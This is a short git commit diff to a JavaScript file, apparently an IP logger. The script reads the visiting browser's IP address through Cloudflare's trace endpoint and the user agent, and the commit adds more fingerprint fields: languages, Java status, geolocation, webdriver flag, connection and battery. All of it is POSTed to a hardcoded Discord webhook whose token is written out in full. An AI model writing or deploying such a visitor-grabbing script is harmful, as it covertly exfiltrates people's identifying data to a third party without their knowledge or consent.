7f042c6b9c43e91d439fad87099eb6f97db90f26
PastebinNotAvaliable <132144508+PasteBinNotAvailable@users.noreply.github.com>
2023-06-22 15:28:03 +0700

    Update script.js

--- script.js
+++ script.js
@@ -6,7 +6,13 @@ text('https://www.cloudflare.com/cdn-cgi/trace').then(data => {
   let ipRegex = /[0-9]{1,3}.[0-9]{1,3}.[0-9]{1,3}.[0-9]{1,3}/
   let ip = data.match(ipRegex)[0];
   var agent = navigator.userAgent;
-  var udata = ip + " " + agent;
+    let lang  = navigator.languages;
+  let javaEnabled = navigator.javaEnabled;
+  let geolocation = navigator.geolocation;
+  let webdriver = navigator.webdriver;
+  let sysconnection = navigator.connection;
+  let sysbattery = navigator.getBattery;
+  var udata = ip + " " + agent + " " + lang + " " + javaEnabled + " (javaEnabled)" + " " + geolocation + " " + webdriver + " " + sysconnection + " " + sysbattery;
   const xml = new XMLHttpRequest;
    xml.open("POST", "https://discord.com/api/webhooks/1121323380285636671/3U0PA0ro8S3MWMOq01dRFfXLlwfe2mrjAT4QqmnIen_Hw4n3G6DBUFzrjSrUeOrPgyQz");
 
